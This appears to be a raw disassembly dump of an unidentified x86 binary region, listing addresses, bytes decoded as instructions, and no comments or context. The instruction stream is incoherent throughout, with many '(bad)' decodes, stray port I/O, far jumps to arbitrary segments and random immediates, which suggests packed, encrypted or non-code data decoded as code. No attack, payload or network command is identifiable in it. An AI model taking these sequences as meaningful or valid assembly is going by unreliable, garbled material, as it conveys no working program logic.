  413fe6:	dec    ebx
  413fe7:	mov    WORD PTR [edi-0x3ada93e8],es
  413fed:	ja     0x414030
  413fef:	sub    ch,BYTE PTR [ebp+0x15]
  413ff2:	or     al,ah
  413ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ff5:	lods   eax,DWORD PTR ds:[esi]
  413ff6:	push   ecx
  413ff7:	call   0x8594:0xcb80dcf7
  413ffe:	jnp    0x413fdb
  414000:	sbb    ah,BYTE PTR [esi-0x6266f560]
  414006:	in     al,0xac
  414008:	out    0xcb,eax
  41400a:	dec    esp
  41400b:	int3   
  41400c:	sahf   
  41400d:	push   0xffffffa9
  41400f:	inc    edi
  414010:	mov    ebx,0xa7787ab1
  414015:	push   esp
  414016:	ror    DWORD PTR [edi],0x58
  414019:	repz sub DWORD PTR cs:[eax+0x22db3138],ebx
  414021:	les    edi,FWORD PTR [ebx+0x4935c5e2]
  414027:	inc    ebp
  414028:	mov    eax,ds:0x634b388d
  41402d:	pop    esi
  41402e:	lds    esi,FWORD PTR [edi]
  414030:	shl    DWORD PTR [ebx-0x40],0x9a
  414034:	add    BYTE PTR [ecx-0x1ab2a179],ah
  41403a:	int3   
  41403b:	push   ebx
  41403c:	out    dx,al
  41403d:	ret    
  41403e:	lock loope 0x41405f
  414041:	mov    bl,0x24
  414043:	mov    ch,0xe1
  414045:	push   0x3e3c8d54
  41404a:	(bad)  
  41404b:	push   ecx
  41404c:	bound  edx,QWORD PTR [edx-0xc]
  41404f:	shl    BYTE PTR [eax+ebp*4],cl
  414052:	and    dh,al
  414054:	int    0xf5
  414056:	mov    ah,0x58
  414058:	mov    BYTE PTR [edi-0x2],bh
  41405b:	jns    0x414029
  41405d:	push   ebx
  41405e:	or     ebp,esp
  414060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414061:	add    eax,0xaaa4970c
  414066:	rcl    ch,1
  414068:	rcl    BYTE PTR [ebx+0x55bba724],0x5a
  41406f:	iret   
  414070:	div    BYTE PTR [esi+0x5c]
  414073:	adc    eax,0xa0d245bc
  414078:	push   ebp
  414079:	in     eax,dx
  41407a:	jbe    0x4140f2
  41407c:	lock xor al,ch
  41407f:	popa   
  414080:	int    0x25
  414082:	in     al,dx
  414083:	cwde   
  414084:	xor    ah,BYTE PTR [edx-0x60]
  414087:	hlt    
  414088:	inc    ebp
  414089:	imul   edi,DWORD PTR [edx],0x81193230
  41408f:	push   edx
  414090:	ja     0x4140a4
  414092:	and    cl,BYTE PTR fs:0x786b23cc
  414099:	mov    ebx,0x893ca928
  41409e:	jecxz  0x414106
  4140a0:	adc    BYTE PTR [esi],cl
  4140a2:	mov    ds:0x6a8f2e3e,eax
  4140a7:	ret    0xbabf
  4140aa:	or     DWORD PTR [esi+edi*4-0x2bc24d17],eax
  4140b1:	aaa    
  4140b2:	dec    esp
  4140b3:	sbb    cl,BYTE PTR [esi]
  4140b5:	test   eax,0xa12e142f
  4140ba:	addr16 push ds
  4140bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140bd:	call   0x82c1:0xb56098a6
  4140c4:	loope  0x4140c4
  4140c6:	loopne 0x41409e
  4140c8:	pushf  
  4140c9:	xchg   DWORD PTR [esi+ecx*4+0x70],ebp
  4140cd:	mov    ?,WORD PTR [eax-0x244f64c2]
  4140d3:	jno    0x4140ef
  4140d5:	sbb    edx,edx
  4140d7:	push   edx
  4140d8:	mov    ds,WORD PTR fs:[edx]
  4140db:	and    dl,BYTE PTR [edi+0x76811bad]
  4140e1:	fistp  DWORD PTR [esi-0x8]
  4140e4:	sub    dl,BYTE PTR [ebp-0x2a]
  4140e7:	in     al,dx
  4140e8:	mov    eax,ds:0x33e64d26
  4140ed:	pop    ecx
  4140ee:	xchg   ebx,eax
  4140ef:	je     0x41413f
  4140f1:	out    dx,eax
  4140f2:	mov    ah,0xa2
  4140f4:	iret   
  4140f5:	aam    0x6b
  4140f7:	xor    DWORD PTR [ebx+ebp*2+0x37],ebp
  4140fb:	addr16 in eax,0xd9
  4140fe:	and    BYTE PTR [ecx-0x2a3211ce],0x30
  414105:	adc    edi,DWORD PTR [ecx-0x1e7d67bf]
  41410b:	cmp    al,0x73
  41410d:	jno    0x41411c
  41410f:	xchg   esp,eax
  414111:	or     al,0xad
  414113:	lea    eax,[ebx]
  414115:	test   al,0x7e
  414117:	push   esi
  414118:	ret    
  414119:	sub    DWORD PTR [edi-0x6687baae],ebp
  41411f:	xchg   edx,eax
  414120:	mov    al,ds:0x664a44a7
  414125:	or     DWORD PTR [esi],eax
  414127:	jp     0x414158
  414129:	sar    DWORD PTR [ebx-0x45302e2c],0xaa
  414130:	je     0x4140b4
  414132:	xchg   edx,eax
  414133:	sbb    DWORD PTR ds:0xa7ca410e,ebp
  414139:	inc    ecx
  41413a:	mov    al,ds:0x49e0ff8c
  41413f:	jae    0x414130
  414141:	mov    ecx,0x4056bf29
  414146:	jo     0x4141ae
  414148:	pop    esi
  414149:	repz pop edi
  41414b:	aam    0x1b
  41414d:	add    eax,0xb0b8942f
  414152:	pop    eax
  414153:	jl     0x41416d
  414155:	aas    
  414156:	imul   esp,edi,0xf6a6e6a0
  41415c:	pop    ecx
  41415d:	enter  0x1656,0x4d
  414161:	imul   ecx,DWORD PTR [ebx+0x4f],0xbdcfef33
  414168:	(bad)  
  414169:	mov    eax,0x394e3327
  41416e:	ds mov bl,0x46
  414171:	mov    esp,0x3d6626f7
  414176:	fs mov bh,0xd7
  414179:	jp     0x41410f
  41417b:	pop    ds
  41417c:	push   ss
  41417d:	call   0xebccab28
  414182:	jmp    0x99ae84e3
  414187:	bound  ebp,QWORD PTR [edx+0x33]
  41418a:	cli    
  41418b:	jecxz  0x41414b
  41418d:	adc    eax,0xfe087c8c
  414192:	stc    
  414193:	or     DWORD PTR [eax+0x72],eax
  414196:	(bad)  
  414197:	(bad)  [eax-0x3d]
  41419a:	inc    ebx
  41419b:	push   cs
  41419c:	je     0x41412d
  41419e:	push   DWORD PTR [ebx+0x6c081a2e]
  4141a4:	lods   eax,DWORD PTR ds:[esi]
  4141a5:	add    edi,eax
  4141a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141a8:	dec    esp
  4141a9:	push   0x9f3ae6d9
  4141ae:	sub    DWORD PTR [edi+0x75],0xe11e9bcf
  4141b5:	mov    edi,0x21b2b412
  4141ba:	mov    bh,0xf
  4141bc:	and    eax,0xb30bd38
  4141c1:	add    esi,edx
  4141c3:	gs cwde 
  4141c5:	xor    eax,0x80d27303
  4141ca:	jae    0x4141c1
  4141cc:	retf   0x6b66
  4141cf:	mov    ch,0x86
  4141d1:	clc    
  4141d2:	fcom   DWORD PTR [esi+0x8b89b9]
  4141d8:	repz retf 0xad78
  4141dc:	mov    cl,0x79
  4141de:	(bad)  
  4141df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e0:	pop    ebx
  4141e1:	repnz mov WORD PTR [edi-0x1],?
  4141e5:	mov    cl,0x86
  4141e7:	push   esp
  4141e8:	icebp  
  4141e9:	sar    BYTE PTR [esi+eax*2-0x3b],cl
  4141ed:	xor    BYTE PTR [eax],bh
  4141ef:	lods   al,BYTE PTR ds:[esi]
  4141f0:	xor    BYTE PTR ds:0xafc6fbe1,al
  4141f6:	pop    es
  4141f7:	cli    
  4141f8:	std    
  4141f9:	idiv   BYTE PTR [ebx+0x3c5c962e]
  4141ff:	and    eax,DWORD PTR [ebx-0x27]
  414202:	fisubr DWORD PTR [edi-0x2e]
  414205:	dec    edx
  414206:	fcmove st,st(7)
  414208:	mov    ebp,0x92315da3
  41420d:	pop    edx
  41420e:	in     al,0xd5
  414210:	cmp    ch,BYTE PTR ds:[ebx]
  414213:	aam    0x9c
  414215:	jmp    0x98966d
  41421a:	aad    0x2f
  41421c:	adc    bh,BYTE PTR [ecx-0x308a2f4a]
  414222:	pop    ecx
  414223:	jg     0x41423d
  414225:	test   BYTE PTR [ebx],dh
  414227:	xchg   esi,eax
  414228:	ins    BYTE PTR es:[edi],dx
  414229:	mov    cl,0x1e
  41422b:	or     eax,0x573bfb19
  414230:	cmp    BYTE PTR [ebp-0x32],bl
  414233:	mov    al,BYTE PTR [eax+0x3b70f6d7]
  414239:	leave  
  41423a:	cmp    eax,0x161cf793
  41423f:	add    ebp,DWORD PTR [esi]
  414241:	out    dx,eax
  414242:	cmc    
  414243:	cli    
  414244:	mov    bl,0xc
  414246:	aad    0x38
  414248:	inc    esi
  414249:	sbb    al,0xe5
  41424b:	fs mov bh,ch
  41424e:	stos   DWORD PTR es:[edi],eax
  41424f:	jae    0x4141e2
  414251:	jg     0x4141e1
  414253:	and    DWORD PTR [edx],esi
  414255:	sbb    BYTE PTR ds:0x5a64a1f7,dh
  41425b:	cmp    cl,bl
  41425d:	push   0xffffffaa
  41425f:	jne    0x4141ec
  414261:	mov    ebx,0xeddf8e93
  414266:	and    eax,0x841f9ca6
  41426b:	call   0x356a1395
  414270:	and    DWORD PTR [edi],ebx
  414272:	sbb    DWORD PTR [edx-0x53065f76],ebp
  414278:	dec    ebp
  414279:	sti    
  41427a:	pusha  
  41427b:	adc    eax,0x38e22755
  414280:	test   BYTE PTR [eax-0x57],dl
  414283:	xor    al,0x31
  414285:	push   es
  414286:	fsubr  QWORD PTR [edi+eax*2+0xc]
  41428a:	lea    esp,[edi-0x63]
  41428d:	inc    ebp
  41428e:	gs push esp
  414290:	sub    DWORD PTR [esp+edi*1+0x71],0xffffff84
  414295:	pop    eax
  414296:	mov    ah,0x38
  414298:	push   esp
  414299:	in     al,dx
  41429a:	sbb    ah,BYTE PTR ds:0x26a51e44
  4142a0:	inc    ebp
  4142a1:	fneni(8087 only) 
  4142a3:	jp     0x4142c3
  4142a5:	mov    ds:0x9fedfb50,eax
  4142aa:	shl    BYTE PTR [ebp+0x76063afd],cl
  4142b0:	in     ax,0xb5
  4142b3:	adc    DWORD PTR [edx],ecx
  4142b5:	sub    bl,BYTE PTR [ebx]
  4142b7:	in     al,0xa5
  4142b9:	xchg   esi,eax
  4142ba:	repz jecxz 0x414285
  4142bd:	sub    BYTE PTR [esi],dl
  4142bf:	(bad)  
  4142c0:	loope  0x414287
  4142c2:	dec    ecx
  4142c3:	lock in eax,dx
  4142c5:	jle    0x414250
  4142c7:	xchg   DWORD PTR [ebx-0x7e],eax
  4142ca:	mov    esi,0x32279b03
  4142cf:	cmp    BYTE PTR [edx],0x8a
  4142d2:	jle    0x4142f1
  4142d4:	push   edx
  4142d5:	inc    eax
  4142d6:	daa    
  4142d7:	nop
  4142d8:	loope  0x414342
  4142da:	pop    esi
  4142db:	mov    al,0xe
  4142dd:	add    al,0x41
  4142df:	pop    es
  4142e0:	dec    edi
  4142e1:	aam    0xd0
  4142e3:	sti    
  4142e4:	psrld  mm7,QWORD PTR [eax+edx*2-0x421e9589]
  4142ec:	push   0x7b
  4142ee:	add    BYTE PTR [edi+0x61],0xe0
  4142f2:	push   ecx
  4142f3:	(bad)  
  4142f4:	adc    DWORD PTR [ebx+0x1f],esi
  4142f7:	cs jns 0x414328
  4142fa:	push   0x88269a17
  4142ff:	sti    
  414300:	(bad)  [esi+0x42a4d1a6]
  414306:	outs   dx,DWORD PTR ds:[esi]
  414307:	add    dh,BYTE PTR [edi]
  414309:	pop    ebx
  41430a:	out    dx,eax
  41430b:	dec    esp
  41430c:	out    dx,al
  41430d:	pop    eax
  41430f:	mov    dl,0xaa
  414311:	jo     0x4142ad
  414313:	add    al,0x22
  414315:	mov    eax,0x5da8a177
  41431a:	mov    ebx,0x7db419a2
  414320:	xor    cl,BYTE PTR [ebx+0x1c034c56]
  414326:	push   eax
  414327:	cmp    DWORD PTR [edx+ebx*1],eax
  41432a:	sbb    DWORD PTR [eax-0x62],esp
  41432d:	sbb    edx,0x237244a0
  414333:	sahf   
  414334:	push   ecx
  414335:	add    cl,BYTE PTR [ebp-0x16d0c2f6]
  41433b:	xlat   BYTE PTR ds:[ebx]
  41433c:	cmp    DWORD PTR [ebp-0x774f5739],edx
  414342:	xchg   ecx,eax
  414343:	xchg   ebx,eax
  414344:	jo     0x41437e
  414346:	(bad)  
  414347:	mov    ebp,0x75919ff2
  41434c:	int    0x50
  41434e:	push   es
  41434f:	cli    
  414350:	jle    0x4142e5
  414352:	cmp    DWORD PTR es:0xcd2ea534,0x33a0829e
  41435d:	mov    esi,0xf3f72ef6
  414362:	out    dx,al
  414363:	pop    ss
  414364:	enter  0xccce,0x3f
  414368:	pushf  
  414369:	std    
  41436a:	ret    
  41436b:	dec    esp
  41436c:	aas    
  41436d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41436e:	sti    
  41436f:	das    
  414370:	test   DWORD PTR [ecx+eax*1-0x41e85323],edi
  414377:	adc    ebx,DWORD PTR gs:[ecx]
  41437a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437b:	retf   
  41437c:	mov    dl,0x15
  41437e:	enter  0x3909,0x8a
  414382:	js     0x41434a
  414384:	mov    WORD PTR [esi],cs
  414386:	jl     0x41439c
  414388:	stc    
  414389:	xchg   esp,eax
  41438a:	add    DWORD PTR [ebp*1-0xe657f7a],esi
  414391:	push   0x10
  414393:	aad    0xb1
  414395:	jb     0x4143c2
  414397:	mov    bh,0x8f
  414399:	sub    eax,0xf338df76
  41439e:	mov    bl,0x2d
  4143a0:	into   
  4143a1:	push   eax
  4143a2:	xchg   BYTE PTR [edx],al
  4143a4:	retf   0x44be
  4143a7:	fild   QWORD PTR [eax+edi*4+0x365b7891]
  4143ae:	ja     0x414357
  4143b0:	inc    BYTE PTR [ebx+esi*4+0x27]
  4143b4:	push   ebx
  4143b5:	ja     0x414346
  4143b7:	or     BYTE PTR [ebp+0x31ba72d3],bl
  4143bd:	in     eax,dx
  4143be:	aaa    
  4143bf:	or     ecx,edi
  4143c1:	daa    
  4143c2:	mov    dh,0xc9
  4143c4:	cld    
  4143c5:	imul   ecx,DWORD PTR [edx],0xffffffaa
  4143c8:	push   0xb955f5b8
  4143cd:	push   edx
  4143ce:	pop    es
  4143cf:	inc    ebp
  4143d0:	shl    BYTE PTR [eax],cl
  4143d2:	lds    ebp,FWORD PTR [ecx]
  4143d4:	ret    0xf2d4
  4143d7:	adc    esp,edx
  4143d9:	mov    gs:0x7dc45ca7,eax
  4143df:	scas   al,BYTE PTR es:[edi]
  4143e0:	mov    ecx,0xc277380e
  4143e5:	sbb    BYTE PTR [edx-0x8506851],al
  4143eb:	xchg   DWORD PTR [esi],edx
  4143ed:	shl    BYTE PTR [edi+0x5bbb9d2e],0x19
  4143f4:	mov    edx,gs
  4143f6:	in     al,dx
  4143f7:	inc    edi
  4143f8:	iret   
  4143f9:	mov    dl,0x90
  4143fb:	sti    
  4143fc:	jae    0x4143a1
  4143fe:	jmp    0x5747:0xede7328d
  414405:	out    0x7d,al
  414407:	sub    edx,DWORD PTR [eax+0x7]
  41440a:	fmul   QWORD PTR [ebx-0x7414ccdf]
  414410:	sbb    eax,0xadc0c295
  414415:	adc    BYTE PTR [edx-0x7a55fb9],ch
  41441b:	daa    
  41441c:	mov    ch,0xa7
  41441e:	or     eax,0xd79b5b1f
  414423:	fsubr  QWORD PTR [ebx]
  414425:	push   0xffffffc6
  414427:	jnp    0x414459
  414429:	sub    al,0xb
  41442b:	mov    dh,0x94
  41442d:	(bad)  
  41442e:	jb     0x4143e8
  414430:	out    0x52,eax
  414432:	pop    ss
  414433:	dec    edi
  414434:	xor    edx,ebx
  414436:	jmp    0x19ac:0xbaaadb4d
  41443d:	mov    ah,0x2
  41443f:	mov    ds:0xbbd87418,eax
  414444:	lock je 0x4144b2
  414447:	mov    ecx,0x7d4877e
  41444c:	jae    0x41448a
  41444e:	mov    DWORD PTR [ecx-0x79122b28],0xe111375f
  414458:	jp     0x414427
  41445a:	xor    cl,0x59
  41445d:	je     0x414418
  41445f:	(bad)  
  414461:	ficomp WORD PTR [ebx]
  414463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414464:	repnz shr BYTE PTR [edx-0x1],0xe6
  414469:	repz cmc 
  41446b:	sar    edi,0xdb
  41446e:	out    dx,al
  41446f:	sahf   
  414470:	ret    
  414471:	or     al,0x87
  414473:	daa    
  414474:	or     BYTE PTR [esi+0x374a993a],bh
  41447a:	aaa    
  41447b:	nop
  41447c:	mov    cl,0x50
  41447e:	pop    esp
  41447f:	retf   0x4366
  414482:	fs xchg edi,eax
  414484:	sub    DWORD PTR [ecx],esi
  414486:	frstor [ecx]
  414488:	iret   
  414489:	inc    edx
  41448a:	mov    DWORD PTR [ebp+0x1971f389],ebp
  414490:	les    ebp,FWORD PTR [esi+0x3b]
  414493:	aas    
  414494:	and    ebx,DWORD PTR [ecx-0x72]
  414497:	xor    DWORD PTR [edx+0xe0],edi
	...
  414511:	add    BYTE PTR [eax],al
  414513:	add    ah,ch
  414515:	ss ins BYTE PTR es:[edi],dx
  414517:	or     esi,edi
  414519:	pop    ebx
  41451a:	in     eax,dx
  41451b:	test   DWORD PTR [edi-0x26],0x67549ed2
  414522:	gs pop eax
  414524:	icebp  
  414525:	jmp    0x414527
  414527:	add    BYTE PTR [esi+0x7],ch
  41452a:	add    BYTE PTR [eax],al
  41452c:	or     eax,0x577504ae
  414531:	mov    ah,0x54
  414533:	repz cmp al,0xff
  414536:	into   
  414537:	mov    ebp,0xcff8e820
  41453c:	xchg   esp,eax
  41453d:	xchg   ebp,eax
  41453e:	stos   BYTE PTR es:[edi],al
  41453f:	adc    al,0x86
  414541:	stc    
  414542:	shl    ebx,0xa6
  414545:	hlt    
  414546:	dec    edx
  414547:	ss mov cl,0x31
  41454a:	retf   0x585c
  41454d:	xchg   ebp,eax
  41454e:	push   ebp
  41454f:	pop    ebx
  414550:	dec    esi
  414551:	push   ebp
  414552:	shl    edx,cl
  414554:	mov    al,ds:0x25b46662
  414559:	and    DWORD PTR [edx],esi
  41455b:	inc    eax
  41455c:	idiv   DWORD PTR [esi]
  41455e:	dec    esi
  41455f:	nop
  414560:	sahf   
  414561:	loope  0x4144f4
  414563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414564:	aam    0xcd
  414566:	push   edx
  414567:	cmc    
  414568:	fst    QWORD PTR [ecx-0xf]
  41456b:	sub    eax,0x32129207
  414570:	adc    al,0xc9
  414572:	mov    ebp,0x1720d459
  414577:	out    0x6a,eax
  414579:	add    cl,dl
  41457b:	popf   
  41457c:	pop    esp
  41457d:	daa    
  41457e:	mov    gs,WORD PTR [eax-0x50]
  414581:	arpl   WORD PTR [edx+0x4c2f60f2],bp
  414587:	in     al,dx
  414588:	adc    eax,0x1cb1c9eb
  41458d:	sbb    cl,BYTE PTR [ebp-0x724748b2]
  414593:	sbb    eax,0x54c5c6a8
  414598:	xchg   DWORD PTR [ebp-0x7c],esi
  41459b:	rcr    DWORD PTR [ebp-0x6b],1
  41459e:	xor    BYTE PTR [ecx+edx*8+0x4],bh
  4145a2:	ins    DWORD PTR es:[edi],dx
  4145a3:	jae    0x4145a5
  4145a5:	out    0x5a,al
  4145a7:	push   ebp
  4145a8:	lods   eax,DWORD PTR ds:[esi]
  4145a9:	fist   WORD PTR [ebp+0x66]
  4145ac:	xor    DWORD PTR [ebx+0x7b3be685],eax
  4145b2:	pop    ebp
  4145b3:	jp     0x4145e0
  4145b5:	xchg   BYTE PTR [ebp+0x18b586ff],ah
  4145bb:	out    0xdf,al
  4145bd:	iret   
  4145be:	add    BYTE PTR ds:0x988297ce,dh
  4145c4:	push   es
  4145c5:	rol    DWORD PTR [edi-0x3c],0xee
  4145c9:	or     BYTE PTR [ebx],bl
  4145cb:	stos   BYTE PTR es:[edi],al
  4145cc:	sbb    bh,ch
  4145ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145cf:	stc    
  4145d0:	rol    dl,cl
  4145d2:	adc    al,BYTE PTR [edx+ebx*4]
  4145d5:	pop    es
  4145d6:	add    eax,0x1c7554db
  4145db:	adc    al,0xe
  4145dd:	imul   edi,DWORD PTR [ecx],0x124958d1
  4145e3:	mov    DWORD PTR [ebp+0x3013bef1],eax
  4145e9:	cmp    bh,BYTE PTR [ebp-0x5eb58d1f]
  4145ef:	or     ah,ch
  4145f1:	adc    ah,BYTE PTR [edi]
  4145f3:	imul   DWORD PTR [ecx+ebx*2]
  4145f6:	mov    fs:0x741063e2,eax
  4145fc:	and    esp,DWORD PTR [ecx+0x15]
  4145ff:	fs js  0x4145e0
  414602:	mov    eax,cs
  414604:	cmp    edi,esi
  414606:	sub    al,0xa
  414608:	out    dx,al
  414609:	dec    edx
  41460a:	sbb    ch,ch
  41460c:	test   BYTE PTR [ebx-0x25],ch
  41460f:	sbb    DWORD PTR [esi],esi
  414611:	xor    BYTE PTR [ebp-0x237f7c01],ah
  414617:	push   ds
  414618:	inc    ebx
  414619:	pop    esp
  41461a:	arpl   WORD PTR [ebp+0x37ed7a42],sp
  414620:	mov    fs,WORD PTR ds:0xc89fea4b
  414626:	mov    ebp,0xaca28973
  41462b:	mov    ecx,eax
  41462d:	cmp    al,0x9b
  41462f:	push   ds
  414630:	fcomp  st(5)
  414632:	pop    ds
  414633:	and    cl,0x22
  414636:	pop    edi
  414637:	mov    ebx,0x70afdff4
  41463c:	test   al,0x87
  41463e:	sbb    ebp,DWORD PTR [edx-0x2c]
  414641:	outs   dx,DWORD PTR ds:[esi]
  414642:	push   cs
  414643:	cmp    eax,0xa70f7f45
  414648:	sti    
  414649:	lock inc esi
  41464b:	mov    al,0x7a
  41464d:	addr16 in al,0x8
  414650:	cmp    DWORD PTR [ebp-0x56e0d3fb],edx
  414656:	pop    ss
  414657:	push   ss
  414658:	(bad)  
  41465a:	bound  edx,QWORD PTR [eax]
  41465c:	sbb    eax,0xc5c74dd8
  414661:	mov    edx,0xa894a7a
  414666:	push   edi
  414667:	pop    edi
  414668:	add    esp,DWORD PTR [ebx+ebx*1+0x20]
  41466c:	imul   esp,DWORD PTR [ecx],0xaf55a707
  414672:	sbb    eax,0x79faab6f
  414677:	nop
  414678:	test   BYTE PTR [edx+0x41d61925],ah
  41467e:	enter  0xdf39,0x9c
  414682:	pop    esp
  414683:	sbb    eax,DWORD PTR [ecx-0x5fa3c32b]
  414689:	xor    DWORD PTR [eax-0x7b],ecx
  41468c:	or     ebx,esi
  41468e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468f:	pusha  
  414690:	jne    0x414701
  414692:	mov    WORD PTR ds:0x19e44a2b,?
  414698:	xor    cl,BYTE PTR [esi-0x4b]
  41469b:	in     eax,0x7b
  41469d:	push   cs
  41469e:	pop    ss
  41469f:	sub    DWORD PTR [edi+0x3580b658],ebx
  4146a5:	dec    eax
  4146a6:	jle    0x4146be
  4146a8:	jl     0x4146d8
  4146aa:	je     0x41468e
  4146ac:	popa   
  4146ad:	cmp    DWORD PTR [eax-0x1f],0x345ba5dd
  4146b4:	shl    ebx,0xcd
  4146b7:	ret    
  4146b8:	(bad)  
  4146b9:	cmc    
  4146ba:	mov    eax,ds:0xdf22c887
  4146bf:	adc    BYTE PTR [ecx+0x12],ah
  4146c2:	add    DWORD PTR [ebx+0x6989baa8],0xffffffd1
  4146c9:	sbb    ecx,DWORD PTR [eax+0x4203466f]
  4146cf:	jl     0x414713
  4146d1:	xor    al,0x40
  4146d3:	xchg   edi,eax
  4146d4:	cmp    DWORD PTR [edx-0x47],esi
  4146d7:	sti    
  4146d8:	lods   al,BYTE PTR ds:[esi]
  4146d9:	daa    
  4146da:	cmp    eax,0x8e6bdbb5
  4146df:	adc    bh,dl
  4146e1:	in     eax,0xd3
  4146e3:	or     BYTE PTR [ebp-0x1f],dh
  4146e6:	or     eax,0xac277781
  4146eb:	jae    0x414690
  4146ed:	in     eax,0xa1
  4146ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f0:	and    al,0x94
  4146f2:	xchg   ebx,eax
  4146f3:	jno    0x41470a
  4146f5:	inc    esp
  4146f6:	xchg   ebp,eax
  4146f7:	push   eax
  4146f8:	mov    edi,0x81fbb2
  4146fd:	and    eax,0x3a2e585e
  414702:	sub    ebx,ebp
  414704:	lods   eax,DWORD PTR ds:[esi]
  414705:	dec    esi
  414706:	sub    eax,0xbe68168d
  41470b:	xlat   BYTE PTR ds:[ebx]
  41470c:	xor    BYTE PTR ds:0x2e3a446a,dl
  414712:	jle    0x414695
  414714:	std    
  414715:	inc    esp
  414716:	cmp    cl,BYTE PTR [edi]
  414718:	sbb    bh,bh
  41471a:	xor    BYTE PTR [ebp+0x6b82c799],bh
  414720:	pop    eax
  414721:	int    0x36
  414723:	xchg   edx,eax
  414724:	and    edi,DWORD PTR [edi-0xd1e09ca]
  41472a:	or     ah,BYTE PTR [ebx]
  41472c:	push   esi
  41472d:	aas    
  41472e:	xchg   cl,dh
  414730:	ins    DWORD PTR es:[edi],dx
  414731:	xor    cl,BYTE PTR [eax+0x24]
  414734:	rcr    bh,cl
  414736:	sbb    BYTE PTR [ebx-0x2f],al
  414739:	cmp    DWORD PTR [esi],esp
  41473b:	cmp    BYTE PTR [eax-0x25],0x5e
  41473f:	inc    esp
  414740:	jae    0x4146f0
  414742:	pop    ebp
  414743:	cdq    
  414744:	pop    ss
  414745:	mov    al,ds:0x2b296afb
  41474a:	imul   esi,DWORD PTR [edx+0x50],0xffffff89
  41474e:	popa   
  41474f:	add    eax,0x5039463d
  414754:	dec    ebp
  414755:	bound  esi,QWORD PTR [eax+edi*1-0x66]
  414759:	test   BYTE PTR ds:0x62e9ce45,ah
  41475f:	mov    ds:0x606b504c,eax
  414764:	iretw  
  414766:	(bad)  
  414767:	lds    edx,FWORD PTR [edi+0x58]
  41476a:	sub    DWORD PTR [edx],0x5c50064c
  414770:	mov    cl,0x73
  414772:	sub    BYTE PTR [edx-0x4cb30da5],0x79
  414779:	push   ebx
  41477a:	fldcw  WORD PTR [ebx+0x79c27f18]
  414780:	add    ecx,0xe7818511
  414786:	retf   
  414787:	(bad)  
  414789:	loope  0x41477b
  41478b:	popf   
  41478c:	in     al,dx
  41478d:	push   esp
  41478e:	sbb    eax,0x636030fc
  414793:	add    al,0x76
  414795:	enter  0x71cc,0xbb
  414799:	test   DWORD PTR [ecx-0x6086dba8],edx
  41479f:	into   
  4147a0:	invd   
  4147a2:	(bad)
  4147a5:	stos   BYTE PTR es:[edi],al
  4147a6:	mov    al,ds:0x2bfd5ded
  4147ab:	fdiv   QWORD PTR [ecx+0x70]
  4147ae:	mov    esi,0xcda06635
  4147b3:	jecxz  0x414767
  4147b5:	cmp    DWORD PTR [esi-0x6a],esp
  4147b8:	adc    al,0xe4
  4147ba:	pop    ebp
  4147bb:	ss push eax
  4147bd:	sub    dh,BYTE PTR [eax+esi*2]
  4147c0:	test   eax,0x29239b26
  4147c5:	sub    edi,ebx
  4147c7:	les    esp,FWORD PTR [ebp-0x78aa698e]
  4147cd:	mul    BYTE PTR [ecx+edx*1]
  4147d0:	or     ah,BYTE PTR [esi+0x2f]
  4147d3:	mov    esp,0x39a49c31
  4147d8:	jne    0x414761
  4147da:	push   0xfffffff7
  4147dc:	mov    DWORD PTR [esi],ebp
  4147de:	test   BYTE PTR [ecx+ecx*4],0x85
  4147e2:	cs xor bl,bl
  4147e5:	jb     0x4147b4
  4147e7:	jmp    esi
  4147e9:	xchg   esp,eax
  4147ea:	sub    dl,cl
  4147ec:	loopne 0x414785
  4147ee:	xor    bh,BYTE PTR [esi+0x3b001553]
  4147f4:	test   BYTE PTR [eax+0x6],0x8c
  4147f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f9:	sti    
  4147fa:	(bad)  
  4147fd:	mov    dh,dl
  4147ff:	addr16 xor ebx,esp
  414802:	jg     0x4147d5
  414804:	daa    
  414805:	inc    esp
  414806:	cs jle 0x41485a
  414809:	add    DWORD PTR [edi],ebp
  41480b:	push   ecx
  41480c:	stos   BYTE PTR es:[edi],al
  41480d:	cmc    
  41480e:	cmp    BYTE PTR [ecx+0x40],dh
  414811:	xchg   bh,dh
  414813:	call   0x8ebd:0x93f74800
  41481a:	jmp    0x9139:0x83ecdd06
  414821:	jmp    0xdbaa:0x88ad6cef
  414828:	test   al,0xa0
  41482a:	std    
  41482b:	add    esp,ebx
  41482d:	popa   
  41482e:	jmp    0x4148a9
  414830:	add    DWORD PTR [esi+eax*1],eax
  414833:	retf   0xafe2
  414836:	fsub   QWORD PTR [edi+ecx*8+0x4025a53c]
  41483d:	jmp    0x7e7220e8
  414842:	fs scas al,BYTE PTR es:[edi]
  414844:	pusha  
  414845:	mov    al,BYTE PTR [ebx+0x77]
  414848:	mov    ds:0xd4547b4e,al
  41484d:	inc    ebx
  41484e:	das    
  41484f:	inc    esi
  414850:	js     0x4148bf
  414852:	dec    edi
  414853:	and    DWORD PTR [esi+0x72ed443c],ebx
  414859:	cmc    
  41485a:	leave  
  41485b:	xor    eax,0x7efe12a5
  414860:	daa    
  414861:	mov    BYTE PTR [edi+0x1491df47],0x62
  414868:	push   esi
  414869:	loopne 0x4147f3
  41486b:	inc    ebp
  41486c:	ins    DWORD PTR es:[edi],dx
  41486d:	jmp    0x4148c1
  41486f:	jmp    0x414824
  414871:	mov    ebp,ecx
  414873:	cmp    DWORD PTR [edi+0xe3f78a5],0xe16cbe79
  41487d:	ds sbb eax,0x6dd10bc7
  414883:	and    al,0x18
  414885:	aad    0xe6
  414887:	xor    bh,BYTE PTR ds:0xa59f9c81
  41488d:	shl    DWORD PTR [ecx+ebx*4-0x4],cl
  414891:	sub    eax,0xc6c530ac
  414896:	push   cs
  414897:	clc    
  414898:	cs scas al,BYTE PTR es:[edi]
  41489a:	inc    ebx
  41489b:	pop    ecx
